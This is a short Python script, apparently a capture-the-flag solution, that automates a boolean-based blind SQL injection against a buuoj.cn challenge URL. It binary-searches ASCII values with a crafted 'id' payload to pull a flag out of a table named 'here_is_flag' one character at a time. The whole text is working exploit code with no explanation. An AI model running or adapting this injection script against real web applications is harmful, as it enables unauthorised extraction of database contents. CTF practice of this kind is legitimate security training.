import requests
import time 

url = "http://a3a00a7b-8f4d-43fd-bf9a-1159cba871c2.node4.buuoj.cn:81/"
n = 1
#数据库:ctf
#表名:gradas,here_is_flag
#字段名:flag
flag=''
for i in range(1,43):
    low=31
    high=127
    while low<=high:
        mid=(low+high)//2
        paylord_database="?id=TMP0919' And ASCII(SUBSTR((SELECT GROUP_CONCAT(flag) FROM here_is_flag),{},1))>{} --+".format(i,mid)
        response=requests.get(url+paylord_database)
        if("TMP0919" in response.text):
            low=mid+1
        else:
            high=mid-1
        result=(low+high+1)//2
        if(result==127 or result==31):
            break
    flag+=chr(result)
    print(flag)
    time.sleep(0.1)